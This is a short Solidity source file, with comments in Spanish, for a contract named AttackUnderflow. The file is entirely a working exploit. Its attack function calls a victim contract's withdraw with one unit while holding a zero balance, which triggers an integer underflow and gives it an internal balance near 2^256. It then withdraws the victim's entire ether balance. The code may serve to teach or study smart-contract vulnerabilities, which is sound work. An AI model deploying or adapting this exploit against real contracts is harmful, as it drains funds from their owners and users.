// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract AttackUnderflow {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public payable {
        // Retiramos 1 unidad teniendo balance 0 para causar underflow
        // Esto nos da un balance interno de casi 2^256
        (bool success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        require(success, "Underflow fallido");
        
        // Ahora retiramos todo el balance real del contrato
        uint currentBalance = victim.balance;
        (bool success2, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", currentBalance));
        require(success2, "Vaciado de fondos fallido");
    }

    receive() external payable {}
}